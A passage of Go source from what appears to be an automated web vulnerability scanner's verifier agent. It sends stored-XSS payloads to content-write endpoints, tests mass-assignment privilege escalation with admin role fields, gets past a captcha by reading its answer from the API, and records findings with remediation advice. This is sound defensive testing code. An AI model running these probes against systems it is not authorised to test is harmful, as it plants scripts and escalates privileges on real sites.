	v.db.InsertNarration(v.scanID, "verifier", "attempt",
		fmt.Sprintf("Planning stored-XSS write→render probes across %d inferred content-write surface(s).", len(candidates)),
		target, nil)

	const maxAttempts = 18
	attempts := 0
	for _, candidate := range candidates {
		if ctx.Err() != nil {
			return
		}
		if attempts >= maxAttempts {
			return
		}
		candidateConfirmed := false
		for _, field := range candidate.InjectFields {
			if candidateConfirmed || attempts >= maxAttempts {
				break
			}
			marker := fmt.Sprintf("AOBTD_STORED_XSS_%d", time.Now().UnixNano())
			for _, payload := range storedXSSPayloads(marker) {
				if ctx.Err() != nil || attempts >= maxAttempts {
					return
				}
				attempts++
				body := cloneJSONMap(candidate.Body)
				body[field] = payload.Payload
				if candidate.RequiresCaptcha {
					captchaID, answer, ok := v.solveJSONCaptcha(ctx, target)
					if !ok {
						break
					}
					body["captchaId"] = captchaID
					body["captcha"] = answer
				}
				result, ok := v.sendStoredXSSJSON(ctx, candidate, body)
				v.tested++
				if !ok {
					v.dismissed++
					continue
				}
				if result.Status < 200 || result.Status >= 300 {
					v.dismissed++
					continue
				}
				stored := jsonBodyContainsString(result.Body, payload.Expected)
				if !stored {
					v.dismissed++
					continue
				}

				var proof *browserXSSProof
				var browserOK bool
				if len(candidate.RenderURLs) > 0 {
					proof, browserOK = v.observeStoredXSSInBrowser(ctx, candidate.RenderURLs, payload)
				}

				v.confirmed++
				v.storeStoredXSSFinding(candidate, field, payload, body, result, proof, browserOK)
				stage := "stored executable HTML"
				urlForNarration := candidate.URL
				if browserOK && proof != nil {
					stage = "browser execution"
					urlForNarration = proof.URL
				}
				v.db.InsertNarration(v.scanID, "verifier", "confirmed",
					fmt.Sprintf("Stored-XSS chain confirmed on %s field %q via %s (%s).",
						candidate.Path, field, payload.Kind, stage),
					urlForNarration, map[string]any{
						"field":        field,
						"payload_kind": payload.Kind,
						"source":       candidate.Source,
					})
				candidateConfirmed = true
				break
			}
		}
	}
}

func storedXSSWriteCandidatesFromTraffic(entries []types.TrafficEntry, target string) []storedXSSWriteCandidate {
	origin := originFromURL(target)
	if origin == "" {
		for _, entry := range entries {
			origin = originFromURL(entry.Request.URL)
			if origin != "" {
				break
			}
		}
	}
	if origin == "" {
		return nil
	}
	origin = strings.TrimRight(origin, "/")

	seen := make(map[string]bool)
	var out []storedXSSWriteCandidate
	add := func(c storedXSSWriteCandidate) {
		if c.URL == "" || len(c.Body) == 0 || len(c.InjectFields) == 0 {
			return
		}
		if c.Method == "" {
			c.Method = "POST"
		}
		if c.Path == "" {
			if parsed, err := url.Parse(c.URL); err == nil {
				c.Path = parsed.Path
			}
		}
		key := c.Method + " " + c.URL + "|" + strings.Join(c.InjectFields, ",")
		if seen[key] {
			return
		}
		seen[key] = true
		out = append(out, c)
	}

	if storedXSSSurfaceObserved(entries, "feedback") {
		add(storedXSSFeedbackCandidate(origin))
	}
	if storedXSSProductSurfaceObserved(entries) {
		add(storedXSSProductCandidate(origin))
	}
	if storedXSSUserSurfaceObserved(entries) {
		add(storedXSSUserCandidate(origin))
	}

	for _, c := range observedJSONWriteCandidates(entries, origin) {
		add(c)
		if len(out) >= 10 {
			return out
		}
	}
	return out
}

func storedXSSFeedbackCandidate(origin string) storedXSSWriteCandidate {
	return storedXSSWriteCandidate{
		URL:  origin + "/api/Feedbacks/",
		Path: "/api/Feedbacks/",
		Body: map[string]any{
			"UserId":  1,
			"rating":  5,
			"comment": "AOBTD stored-XSS probe",
		},
		InjectFields:    []string{"comment"},
		RequiresCaptcha: true,
		RenderURLs: []string{
			origin + "/#/about",
			origin + "/#/administration",
		},
		Source: "observed feedback/comment collection",
	}
}

func storedXSSProductCandidate(origin string) storedXSSWriteCandidate {
	name := fmt.Sprintf("AOBTD XSS Probe %d", time.Now().UnixNano())
	return storedXSSWriteCandidate{
		URL:        origin + "/api/Products",
		Path:       "/api/Products",
		PreferAuth: true,
		Body: map[string]any{
			"name":        name,
			"description": "AOBTD stored-XSS probe",
			"price":       9999.99,
			"image":       "aobtd-xss-probe.jpg",
		},
		InjectFields: []string{"description", "name", "image"},
		RenderURLs: []string{
			origin + "/#/search",
			origin + "/#/search?q=",
			origin + "/#/search?q=" + url.QueryEscape(name),
		},
		Source: "observed product/search collection with renderable content fields",
	}
}

func storedXSSUserCandidate(origin string) storedXSSWriteCandidate {
	return storedXSSWriteCandidate{
		URL:  origin + "/api/Users",
		Path: "/api/Users",
		Body: map[string]any{
			"email":    "aobtd-xss-probe@example.invalid",
			"password": "A0btd-xss-probe!",
		},
		InjectFields: []string{"email"},
		RenderURLs: []string{
			origin + "/#/administration",
			origin + "/#/profile",
		},
		Source: "observed identity/registration surface",
	}
}

func observedJSONWriteCandidates(entries []types.TrafficEntry, origin string) []storedXSSWriteCandidate {
	var out []storedXSSWriteCandidate
	for _, entry := range entries {
		method := strings.ToUpper(entry.Request.Method)
		if method != "POST" && method != "PUT" && method != "PATCH" {
			continue
		}
		ct := headerValue(entry.Request.Headers, "content-type")
		if !strings.Contains(strings.ToLower(ct), "json") && !json.Valid(entry.Request.Body) {
			continue
		}
		var body map[string]any
		if err := json.Unmarshal(entry.Request.Body, &body); err != nil || len(body) == 0 {
			continue
		}
		fields := storedXSSInjectableFields(body)
		if len(fields) == 0 {
			continue
		}
		rawURL := entry.Request.URL
		if originFromURL(rawURL) == "" {
			path := entry.Request.Path
			if !strings.HasPrefix(path, "/") {
				path = "/" + path
			}
			rawURL = origin + path
		}
		renderURLs := storedXSSRenderURLsForPath(origin, entry.Request.Path)
		out = append(out, storedXSSWriteCandidate{
			URL:          rawURL,
			Path:         entry.Request.Path,
			Method:       method,
			Body:         body,
			InjectFields: fields,
			RenderURLs:   renderURLs,
			PreferAuth:   requestHasCredentialMaterial(entry.Request.Headers),
			Source:       "observed JSON write request",
		})
		if len(out) >= 6 {
			return out
		}
	}
	return out
}

func storedXSSSurfaceObserved(entries []types.TrafficEntry, term string) bool {
	term = strings.ToLower(term)
	for _, entry := range entries {
		text := strings.ToLower(entry.Request.Path + " " + entry.Request.URL)
		if strings.Contains(text, term) {
			return true
		}
		if trafficEntryLooksJavaScript(entry) && strings.Contains(strings.ToLower(string(entry.Response.Body)), term) {
			return true
		}
	}
	return false
}

func storedXSSProductSurfaceObserved(entries []types.TrafficEntry) bool {
	if storedXSSSurfaceObserved(entries, "/api/products") || storedXSSSurfaceObserved(entries, "products/search") {
		return true
	}
	for _, entry := range entries {
		if entry.Response.StatusCode < 200 || entry.Response.StatusCode >= 300 {
			continue
		}
		body := strings.ToLower(string(entry.Response.Body))
		if strings.Contains(strings.ToLower(entry.Request.Path), "product") &&
			strings.Contains(body, `"description"`) &&
			strings.Contains(body, `"price"`) &&
			strings.Contains(body, `"image"`) {
			return true
		}
	}
	return false
}

func storedXSSUserSurfaceObserved(entries []types.TrafficEntry) bool {
	if storedXSSSurfaceObserved(entries, "/api/users") ||
		storedXSSSurfaceObserved(entries, "register") ||
		storedXSSSurfaceObserved(entries, "signup") ||
		storedXSSSurfaceObserved(entries, "sign-up") {
		return true
	}
	for _, entry := range entries {
		path := strings.ToLower(entry.Request.Path)
		if strings.Contains(path, "/rest/user/") || strings.Contains(path, "/rest/user") {
			return true
		}
	}
	return false
}

func storedXSSInjectableFields(body map[string]any) []string {
	preferred := []string{
		"comment", "message", "description", "review", "content",
		"text", "body", "title", "name", "username", "email",
		"caption", "bio", "summary", "displayName", "label",
		"image", "imageUrl", "url", "href", "link",
	}
	seen := make(map[string]bool)
	var out []string
	for _, want := range preferred {
		for key, value := range body {
			if seen[key] || !strings.EqualFold(key, want) {
				continue
			}
			if _, ok := value.(string); !ok {
				continue
			}
			seen[key] = true
			out = append(out, key)
			if len(out) >= 3 {
				return out
			}
		}
	}
	return out
}

func storedXSSRenderURLsForPath(origin, path string) []string {
	lower := strings.ToLower(path)
	var out []string
	add := func(hash string) {
		u := strings.TrimRight(origin, "/") + "/#/" + strings.Trim(hash, "/")
		if hash == "/" || strings.Trim(hash, "/") == "" {
			u = strings.TrimRight(origin, "/") + "/#/"
		}
		for _, seen := range out {
			if seen == u {
				return
			}
		}
		out = append(out, u)
	}
	switch {
	case strings.Contains(lower, "feedback") || strings.Contains(lower, "comment"):
		add("about")
		add("administration")
	case strings.Contains(lower, "product") || strings.Contains(lower, "review"):
		add("search")
		add("/")
	case strings.Contains(lower, "user") || strings.Contains(lower, "account") || strings.Contains(lower, "profile"):
		add("administration")
		add("profile")
	default:
		add("/")
	}
	return out
}

func cloneJSONMap(in map[string]any) map[string]any {
	out := make(map[string]any, len(in))
	for k, v := range in {
		out[k] = v
	}
	return out
}

func headerValue(headers map[string]string, name string) string {
	for k, v := range headers {
		if strings.EqualFold(k, name) {
			return v
		}
	}
	return ""
}

func (v *VerifierAgent) solveJSONCaptcha(ctx context.Context, target string) (captchaID int, answer string, ok bool) {
	resp, body, _, err := v.proactiveGET(ctx, strings.TrimRight(target, "/")+"/rest/captcha/")
	if err != nil || resp == nil || resp.StatusCode != 200 {
		return 0, "", false
	}
	var parsed struct {
		CaptchaID int    `json:"captchaId"`
		Answer    string `json:"answer"`
	}
	if err := json.Unmarshal([]byte(body), &parsed); err != nil {
		return 0, "", false
	}
	return parsed.CaptchaID, parsed.Answer, parsed.CaptchaID != 0 && parsed.Answer != ""
}

func (v *VerifierAgent) sendStoredXSSJSON(ctx context.Context, candidate storedXSSWriteCandidate, body map[string]any) (storedXSSWriteResult, bool) {
	bodyBytes, err := json.Marshal(body)
	if err != nil {
		return storedXSSWriteResult{}, false
	}

	authHeaders, authSource := v.credentialHeadersForURL(candidate.URL)
	authHeaders = activeWriteAuthHeaders(authHeaders)
	type authAttempt struct {
		headers map[string]string
		source  string
	}
	attempts := []authAttempt{{}}
	if len(authHeaders) > 0 {
		withAuth := authAttempt{headers: authHeaders, source: authSource}
		if candidate.PreferAuth {
			attempts = []authAttempt{withAuth, {}}
		} else {
			attempts = append(attempts, withAuth)
		}
	}

	for _, attempt := range attempts {
		req, err := http.NewRequestWithContext(ctx, candidate.Method, candidate.URL, strings.NewReader(string(bodyBytes)))
		if err != nil {
			continue
		}
		req.Header.Set("Content-Type", "application/json")
		req.Header.Set("User-Agent", "AOBTD/Verifier (stored-xss write-render probe)")
		for k, val := range attempt.headers {
			lower := strings.ToLower(k)
			if lower == "host" || lower == "content-length" || lower == "content-type" {
				continue
			}
			req.Header.Set(k, val)
		}
		resp, err := v.client.Do(req)
		if err != nil || resp == nil {
			continue
		}
		respBody, _ := io.ReadAll(io.LimitReader(resp.Body, 1024*1024))
		resp.Body.Close()
		if (resp.StatusCode == 401 || resp.StatusCode == 403) && len(attempt.headers) == 0 && len(authHeaders) > 0 {
			continue
		}
		return storedXSSWriteResult{Status: resp.StatusCode, Body: string(respBody), AuthSource: attempt.source}, true
	}
	return storedXSSWriteResult{}, false
}

func (v *VerifierAgent) credentialHeadersForURL(rawURL string) (map[string]string, string) {
	if originFromURL(rawURL) == "" {
		return nil, ""
	}
	if targetOrigin := originFromURL(v.target); targetOrigin != "" && originFromURL(rawURL) != targetOrigin {
		return nil, ""
	}
	out := make(map[string]string)
	source := ""
	if dbHeaders, dbSource, err := v.db.BestCredentialHeaders(v.scanID, rawURL); err == nil {
		for k, val := range dbHeaders {
			out[k] = val
		}
		source = dbSource
	}
	if len(v.learnedAuthHeaders) > 0 {
		for k, val := range v.learnedAuthHeaders {
			out[k] = val
		}
		if source == "" {
			source = "verifier-confirmed auth response"
		} else {
			source += " + verifier-confirmed auth response"
		}
	}
	if len(out) == 0 {
		return nil, ""
	}
	return out, source
}

func jsonBodyContainsString(body, expected string) bool {
	if expected == "" {
		return false
	}
	if strings.Contains(body, expected) {
		return true
	}
	var decoded any
	if err := json.Unmarshal([]byte(body), &decoded); err != nil {
		return false
	}
	return jsonValueContainsString(decoded, expected)
}

func jsonValueContainsString(value any, expected string) bool {
	switch v := value.(type) {
	case string:
		return strings.Contains(v, expected)
	case []any:
		for _, item := range v {
			if jsonValueContainsString(item, expected) {
				return true
			}
		}
	case map[string]any:
		for _, item := range v {
			if jsonValueContainsString(item, expected) {
				return true
			}
		}
	}
	return false
}

func (v *VerifierAgent) observeStoredXSSInBrowser(ctx context.Context, renderURLs []string, payload storedXSSPayload) (*browserXSSProof, bool) {
	if v.browser == nil || v.browser.Browser() == nil {
		return nil, false
	}
	browserPayload := browserXSSPayload{
		payload:       payload.Payload,
		expectedAlert: payload.ExpectedAlert,
		kind:          "stored-" + payload.Kind,
	}
	for _, renderURL := range renderURLs {
		if ctx.Err() != nil {
			return nil, false
		}
		proof, ok := v.executeBrowserXSSProbe(ctx, renderURL, browserPayload, payload.Marker)
		if ok {
			return proof, true
		}
	}
	return nil, false
}

func (v *VerifierAgent) storeStoredXSSFinding(candidate storedXSSWriteCandidate, field string, payload storedXSSPayload, body map[string]any, result storedXSSWriteResult, proof *browserXSSProof, browserOK bool) {
	bodyBytes, _ := json.Marshal(body)
	confidence := types.ConfidenceLikely
	title := fmt.Sprintf("Stored executable HTML accepted by %s field %q", candidate.Path, field)
	description := fmt.Sprintf(
		"%s accepted a write where field %q contained an executable HTML payload (%s) and the API response preserved %q. Source: %s.",
		candidate.Path, field, payload.Kind, payload.Expected, candidate.Source)
	evidence := fmt.Sprintf("Write URL: %s\nField: %s\nPayload kind: %s\nStatus: %d\nAuth source: %s\nResponse preview: %s",
		candidate.URL, field, payload.Kind, result.Status, result.AuthSource, truncateString(result.Body, 500))
	pocResponse := fmt.Sprintf("HTTP/1.1 %d\n\n%s", result.Status, truncateString(result.Body, 600))
	steps := fmt.Sprintf(
		"1. Send a %s request to %s with JSON field %q set to the payload below.\n"+
			"2. Observe the API accepts the write and stores/echoes executable HTML.\n"+
			"3. Visit likely render surfaces for that content class: %s.",
		candidate.Method, candidate.Path, field, strings.Join(candidate.RenderURLs, ", "))

	if browserOK && proof != nil {
		confidence = types.ConfidenceConfirmed
		title = fmt.Sprintf("Stored browser-executed XSS via %s field %q", candidate.Path, field)
		description = fmt.Sprintf(
			"%s accepted a write to %q, then a browser visit to a downstream render surface executed the stored payload (%s). This proves a write→render XSS chain rather than simple reflection.",
			candidate.Path, field, proof.Signal)
		evidence += fmt.Sprintf("\n\nBrowser proof URL: %s\nBrowser signal: %s\nAlert: %s", proof.URL, proof.Signal, proof.AlertMessage)
		pocResponse += fmt.Sprintf("\n\nBrowser proof: %s at %s", proof.Signal, proof.URL)
		steps += fmt.Sprintf("\n4. Browser execution proof: open %s and observe %s.", proof.URL, proof.Signal)
	}

	profile := types.PageProfile{ID: candidate.Method + " " + candidate.Path, URL: candidate.URL, Method: candidate.Method}
	v.storeFinding(profile, types.Finding{
		Title:       title,
		Description: description,
		Severity:    types.SeverityHigh,
		Confidence:  confidence,
		EndpointID:  candidate.Method + " " + candidate.Path,
		VulnType:    "stored_xss",
		ParamName:   field,
		Payload:     payload.Payload,
		PocRequest: fmt.Sprintf("%s %s HTTP/1.1\nHost: <target>\nContent-Type: application/json\n\n%s",
			candidate.Method, candidate.Path, string(bodyBytes)),
		PocResponse:      pocResponse,
		StepsToReproduce: steps,
		Impact: "Stored XSS lets an attacker plant JavaScript that executes later for other users under the target origin. " +
			"Impact includes session actions, credential theft, admin-panel compromise, and chained account takeover.",
		Remediation: "Treat all user-controlled persisted content as untrusted at every render sink. Validate on input only as a guardrail; contextually encode on output and avoid trusting sanitized HTML unless the sanitizer is current, recursively applied, and configured with a strict allowlist.",
		Evidence:    evidence,
	})
}

type massAssignmentCandidate struct {
	URL        string
	Path       string
	Method     string
	Body       map[string]any
	PreferAuth bool
	Source     string
}

type massAssignmentPayload struct {
	Field string
	Value any
}

type massAssignmentWriteResult struct {
	Status     int
	Body       string
	AuthSource string
}

func (v *VerifierAgent) probeMassAssignmentPrivilegeFields(ctx context.Context, target string) {
	entries, err := v.db.GetTrafficByScan(v.scanID)
	if err != nil {
		return
	}
	candidates := massAssignmentCandidatesFromTraffic(entries, target)
	if len(candidates) == 0 {
		return
	}

	v.db.InsertNarration(v.scanID, "verifier", "attempt",
		fmt.Sprintf("Planning mass-assignment privilege-field probes across %d inferred account/profile write surface(s).", len(candidates)),
		target, nil)

	const maxAttempts = 16
	attempts := 0
	for _, candidate := range candidates {
		if ctx.Err() != nil || attempts >= maxAttempts {
			return
		}
		for _, payload := range massAssignmentPayloads(candidate.Body) {
			if ctx.Err() != nil || attempts >= maxAttempts {
				return
			}
			attempts++
			body := cloneJSONMap(candidate.Body)
			massAssignmentNormalizeIdentityFields(body)
			body[payload.Field] = payload.Value

			result, ok := v.sendMassAssignmentJSON(ctx, candidate, body)
			v.tested++
			if !ok || result.Status < 200 || result.Status >= 300 {
				v.dismissed++
				continue
			}
			signal := massAssignmentAcceptanceSignal(payload.Field, result.Body)
			if signal == "" {
				v.dismissed++
				continue
			}

			v.confirmed++
			v.storeMassAssignmentFinding(candidate, payload, body, result, signal)
			v.db.InsertNarration(v.scanID, "verifier", "confirmed",
				fmt.Sprintf("Mass-assignment probe confirmed %s accepts privileged field %q (%s).",
					candidate.Path, payload.Field, signal),
				candidate.URL, map[string]any{
					"field":  payload.Field,
					"source": candidate.Source,
					"signal": signal,
				})
			break
		}
	}
}

func massAssignmentCandidatesFromTraffic(entries []types.TrafficEntry, target string) []massAssignmentCandidate {
	origin := originFromURL(target)
	if origin == "" {
		for _, entry := range entries {
			origin = originFromURL(entry.Request.URL)
			if origin != "" {
				break
			}
		}
	}
	if origin == "" {
		return nil
	}
	origin = strings.TrimRight(origin, "/")

	seen := make(map[string]bool)
	var out []massAssignmentCandidate
	add := func(c massAssignmentCandidate) {
		if c.URL == "" || len(c.Body) == 0 {
			return
		}
		if c.Method == "" {
			c.Method = "POST"
		}
		if c.Path == "" {
			if parsed, err := url.Parse(c.URL); err == nil {
				c.Path = parsed.Path
			}
		}
		key := c.Method + " " + c.URL
		if seen[key] {
			return
		}
		seen[key] = true
		out = append(out, c)
	}

	if storedXSSUserSurfaceObserved(entries) {
		add(massAssignmentUserCandidate(origin))
	}
	for _, c := range observedMassAssignmentWriteCandidates(entries, origin) {
		add(c)
		if len(out) >= 8 {
			return out
		}
	}
	return out
}

func massAssignmentUserCandidate(origin string) massAssignmentCandidate {
	return massAssignmentCandidate{
		URL:    origin + "/api/Users",
		Path:   "/api/Users",
		Method: "POST",
		Body: map[string]any{
			"email":    "aobtd-mass-assignment@example.invalid",
			"password": "A0btd-Mass-Assignment!",
		},
		Source: "observed identity/registration surface",
	}
}

func observedMassAssignmentWriteCandidates(entries []types.TrafficEntry, origin string) []massAssignmentCandidate {
	var out []massAssignmentCandidate
	for _, entry := range entries {
		method := strings.ToUpper(entry.Request.Method)
		if method != "POST" && method != "PUT" && method != "PATCH" {
			continue
		}
		ct := headerValue(entry.Request.Headers, "content-type")
		if !strings.Contains(strings.ToLower(ct), "json") && !json.Valid(entry.Request.Body) {
			continue
		}
		var body map[string]any
		if err := json.Unmarshal(entry.Request.Body, &body); err != nil || len(body) == 0 {
			continue
		}
		if !massAssignmentWriteSurfaceLooksRelevant(entry.Request.Path, body) {
			continue
		}
		rawURL := entry.Request.URL
		if originFromURL(rawURL) == "" {
			path := entry.Request.Path
			if !strings.HasPrefix(path, "/") {
				path = "/" + path
			}
			rawURL = origin + path
		}
		preferAuth := requestHasCredentialMaterial(entry.Request.Headers) || massAssignmentLikelyAuthenticatedPath(entry.Request.Path)
		out = append(out, massAssignmentCandidate{
			URL:        rawURL,
			Path:       entry.Request.Path,
			Method:     method,
			Body:       body,
			PreferAuth: preferAuth,
			Source:     "observed account/profile JSON write request",
		})
		if len(out) >= 6 {
			return out
		}
	}
	return out
}

func massAssignmentWriteSurfaceLooksRelevant(path string, body map[string]any) bool {
	lowerPath := strings.ToLower(path)
	for _, blocked := range []string{"login", "signin", "sign-in", "logout", "token", "password-reset", "forgot-password"} {
		if strings.Contains(lowerPath, blocked) {
			return false
		}
	}
	for _, term := range []string{
		"user", "users", "account", "accounts", "profile", "profiles",
		"member", "members", "customer", "customers", "register", "signup",
		"sign-up", "identity", "/me",
	} {
		if strings.Contains(lowerPath, term) {
			return true
		}
	}
	var identityHints int
	for key := range body {
		normalized := strings.ToLower(strings.ReplaceAll(strings.TrimSpace(key), "_", ""))
		switch normalized {
		case "email", "username", "user", "userid", "password", "displayname", "firstname", "lastname", "phone", "mobile":
			identityHints++
		}
	}
	return identityHints >= 2
}

func massAssignmentLikelyAuthenticatedPath(path string) bool {
	lower := strings.ToLower(path)
	return strings.Contains(lower, "profile") ||
		strings.Contains(lower, "/me") ||
		strings.Contains(lower, "account") ||
		strings.Contains(lower, "settings")
}

func massAssignmentPayloads(_ map[string]any) []massAssignmentPayload {
	return []massAssignmentPayload{
		{Field: "role", Value: "admin"},
		{Field: "roles", Value: []any{"admin"}},
		{Field: "isAdmin", Value: true},
		{Field: "admin", Value: true},
		{Field: "is_admin", Value: true},
		{Field: "permissions", Value: []any{"admin"}},
		{Field: "scope", Value: "admin"},
		{Field: "scopes", Value: []any{"admin"}},
	}
}

func massAssignmentNormalizeIdentityFields(body map[string]any) {
	stamp := time.Now().UnixNano()
	if key, ok := mapStringKey(body, "email"); ok {
		body[key] = fmt.Sprintf("aobtd-mass-%d@example.invalid", stamp)
	}
	if key, ok := mapStringKey(body, "username"); ok {
		body[key] = fmt.Sprintf("aobtd_mass_%d", stamp)
	}
	if key, ok := mapStringKey(body, "userName"); ok {
		body[key] = fmt.Sprintf("aobtd_mass_%d", stamp)
	}
	if key, ok := mapStringKey(body, "password"); ok {
		body[key] = fmt.Sprintf("A0btd-Mass-%d!", stamp%1000000)
	}
}

func mapStringKey(body map[string]any, want string) (string, bool) {
	for key, value := range body {
		if !strings.EqualFold(key, want) {
			continue
		}
		if _, ok := value.(string); ok {
			return key, true
		}
	}
	return "", false
}

func massAssignmentAcceptanceSignal(field, body string) string {
	var decoded any
	if err := json.Unmarshal([]byte(body), &decoded); err != nil {
		return ""
	}
	if signal, ok := jsonPrivilegeFieldAcceptanceSignal(decoded, field); ok {
		return signal
	}
	return ""
}

func jsonPrivilegeFieldAcceptanceSignal(value any, field string) (string, bool) {
	switch typed := value.(type) {
	case map[string]any:
		for key, item := range typed {
			if strings.EqualFold(key, field) && privilegeValueLooksAccepted(field, item) {
				return fmt.Sprintf("%s=%s", key, summarizeJSONValue(item)), true
			}
		}
		for _, item := range typed {
			if signal, ok := jsonPrivilegeFieldAcceptanceSignal(item, field); ok {
				return signal, true
			}
		}
	case []any:
		for _, item := range typed {
			if signal, ok := jsonPrivilegeFieldAcceptanceSignal(item, field); ok {
				return signal, true
			}
		}
	}
	return "", false
}

func privilegeValueLooksAccepted(field string, value any) bool {
	normalizedField := strings.ToLower(strings.ReplaceAll(strings.ReplaceAll(field, "_", ""), "-", ""))
	switch typed := value.(type) {
	case bool:
		return typed && (strings.Contains(normalizedField, "admin") ||
			strings.Contains(normalizedField, "staff") ||
			strings.Contains(normalizedField, "superuser"))
	case string:
		return privilegedStringValue(typed)
	case []any:
		for _, item := range typed {
			if privilegeValueLooksAccepted(field, item) {
				return true
			}
		}
	case map[string]any:
		for key, item := range typed {
			if (privilegedStringValue(key) || strings.Contains(strings.ToLower(key), "admin")) &&
				privilegeValueLooksAccepted(key, item) {
				return true
			}
		}
	}
	return false
}

func privilegedStringValue(value string) bool {
	lower := strings.ToLower(strings.TrimSpace(value))
	lower = strings.Trim(lower, `"'[]{} `)
	switch lower {
	case "admin", "administrator", "superadmin", "super-admin", "root", "owner", "staff":
		return true
	}
	return strings.Contains(lower, "admin") ||
		strings.Contains(lower, "superuser") ||
		strings.Contains(lower, "all:") ||
		strings.Contains(lower, "*")
}

func summarizeJSONValue(value any) string {
	body, err := json.Marshal(value)
	if err != nil {
		return fmt.Sprintf("%v", value)
	}
	return truncateString(string(body), 80)
}

func (v *VerifierAgent) sendMassAssignmentJSON(ctx context.Context, candidate massAssignmentCandidate, body map[string]any) (massAssignmentWriteResult, bool) {
	bodyBytes, err := json.Marshal(body)
	if err != nil {
		return massAssignmentWriteResult{}, false
	}

	method := candidate.Method
	if method == "" {
		method = "POST"
	}
	authHeaders, authSource := v.credentialHeadersForURL(candidate.URL)
	type authAttempt struct {
		headers map[string]string
		source  string
	}
	attempts := []authAttempt{{}}
	if len(authHeaders) > 0 {
		withAuth := authAttempt{headers: authHeaders, source: authSource}
		if candidate.PreferAuth {
			attempts = []authAttempt{withAuth, {}}
		} else {
			attempts = append(attempts, withAuth)
		}
	}

	for _, attempt := range attempts {
		req, err := http.NewRequestWithContext(ctx, method, candidate.URL, strings.NewReader(string(bodyBytes)))
		if err != nil {
			continue
		}
		req.Header.Set("Content-Type", "application/json")
		req.Header.Set("User-Agent", "AOBTD/Verifier (mass-assignment privilege-field probe)")
		for k, val := range attempt.headers {
			lower := strings.ToLower(k)
			if lower == "host" || lower == "content-length" || lower == "content-type" {
				continue
			}
			req.Header.Set(k, val)
		}
		resp, err := v.client.Do(req)
		if err != nil || resp == nil {
			continue
		}
		respBody, _ := io.ReadAll(io.LimitReader(resp.Body, 1024*1024))
		resp.Body.Close()
		if (resp.StatusCode == 401 || resp.StatusCode == 403) && len(attempt.headers) == 0 && len(authHeaders) > 0 {
			continue
		}
		return massAssignmentWriteResult{Status: resp.StatusCode, Body: string(respBody), AuthSource: attempt.source}, true
	}
	return massAssignmentWriteResult{}, false
}

func (v *VerifierAgent) storeMassAssignmentFinding(candidate massAssignmentCandidate, payload massAssignmentPayload, body map[string]any, result massAssignmentWriteResult, signal string) {
	bodyBytes, _ := json.Marshal(body)
	path := candidate.Path
	if path == "" {
		path = candidate.URL
	}
	method := candidate.Method
	if method == "" {
		method = "POST"
	}
	title := fmt.Sprintf("Mass assignment accepted privileged field %q at %s", payload.Field, path)
	description := fmt.Sprintf(
		"%s accepted an account/profile write where client-supplied field %q was set to a privileged value. The response confirmed %s. Source: %s.",
		path, payload.Field, signal, candidate.Source)
	evidence := fmt.Sprintf("Write URL: %s\nField: %s\nAccepted signal: %s\nStatus: %d\nAuth source: %s\nResponse preview: %s",
		candidate.URL, payload.Field, signal, result.Status, result.AuthSource, truncateString(result.Body, 700))
	profile := types.PageProfile{ID: method + " " + path, URL: candidate.URL, Method: method}
	v.storeFinding(profile, types.Finding{
		Title:       title,
		Description: description,
		Severity:    types.SeverityHigh,
		Confidence:  types.ConfidenceConfirmed,
		EndpointID:  method + " " + path,
		VulnType:    "mass_assignment_privilege_escalation",
		ParamName:   payload.Field,
		Payload:     summarizeJSONValue(payload.Value),
		PocRequest: fmt.Sprintf("%s %s HTTP/1.1\nHost: <target>\nContent-Type: application/json\n\n%s",
			method, path, string(bodyBytes)),
		PocResponse: fmt.Sprintf("HTTP/1.1 %d\n\n%s", result.Status, truncateString(result.Body, 800)),
		StepsToReproduce: fmt.Sprintf(
			"1. Send a %s request to %s with normal account/profile JSON plus client-controlled field %q set to %s.\n"+
				"2. Observe the API returns 2xx and confirms %s.\n"+
				"3. Use the resulting account/object in the application; authorization state should never be client-writable.",
			method, path, payload.Field, summarizeJSONValue(payload.Value), signal),
		Impact: "Attackers can self-assign roles, admin flags, permissions, or scopes during account/profile writes. " +
			"This can lead to privilege escalation, admin-panel access, and bypass of business authorization rules.",
		Remediation: "Use a strict server-side allowlist of writable fields for each write operation. Ignore or reject authorization fields from client input, assign roles only through trusted server workflows, and add regression tests that privileged properties cannot be mass-assigned.",
		Evidence:    evidence,
	})
}

type mutableOwnershipCandidate struct {
	URL          string
	Path         string
	Method       string
	Body         map[string]any
	OwnerFields  []string
	PreferAuth   bool
	Source       string
	CreationOnly bool
}

type mutableOwnershipResult struct {
	Status     int
	Body       string
	AuthSource string
}

func (v *VerifierAgent) probeMutableOwnershipFields(ctx context.Context, target string) {
	entries, err := v.db.GetTrafficByScan(v.scanID)
	if err != nil {
		return
	}

	candidates := mutableOwnershipCandidatesFromTraffic(entries, target)
	if len(candidates) > 0 {
		v.db.InsertNarration(v.scanID, "verifier", "attempt",
			fmt.Sprintf("Planning mutable ownership-field probes across %d inferred object-write surface(s).", len(candidates)),
			target, nil)
	}

	const maxAttempts = 10
	attempts := 0
	for _, candidate := range candidates {
		if ctx.Err() != nil || attempts >= maxAttempts {
			return
		}
		for _, field := range candidate.OwnerFields {
			if ctx.Err() != nil || attempts >= maxAttempts {
				return
			}
			original, ok := mapValueCaseInsensitive(candidate.Body, field)
			if !ok {
				continue
			}
			mutated, ok := mutableOwnershipMutatedValue(original)
			if !ok {
				continue
			}
			body := cloneJSONMap(candidate.Body)
			body[field] = mutated
			attempts++
			result, ok := v.sendMutableOwnershipJSON(ctx, candidate, body)
			v.tested++
			if !ok || result.Status < 200 || result.Status >= 300 {
				v.dismissed++
				continue
			}
			signal := mutableOwnershipAcceptanceSignal(field, mutated, result.Body)
			if signal == "" {
				v.dismissed++
				continue
			}
			v.confirmed++
			v.storeMutableOwnershipFinding(candidate, field, mutated, body, result, signal)
			v.db.InsertNarration(v.scanID, "verifier", "confirmed",
				fmt.Sprintf("Mutable ownership-field probe confirmed %s accepts client-controlled %q (%s).",
					candidate.Path, field, signal),
				candidate.URL, map[string]any{
					"field":  field,
					"source": candidate.Source,
					"signal": signal,
				})
			break
		}
	}

	if mutableOwnershipBasketSurfaceObserved(entries) {
		v.probeCartItemForeignKeyMutation(ctx, target, entries)
	}
}

func mutableOwnershipCandidatesFromTraffic(entries []types.TrafficEntry, target string) []mutableOwnershipCandidate {
	origin := originFromURL(target)
	if origin == "" {
		for _, entry := range entries {
			origin = originFromURL(entry.Request.URL)
			if origin != "" {
				break
			}
		}
	}
	if origin == "" {
		return nil
	}
	origin = strings.TrimRight(origin, "/")

	seen := make(map[string]bool)
	var out []mutableOwnershipCandidate
	for _, entry := range entries {
		method := strings.ToUpper(entry.Request.Method)
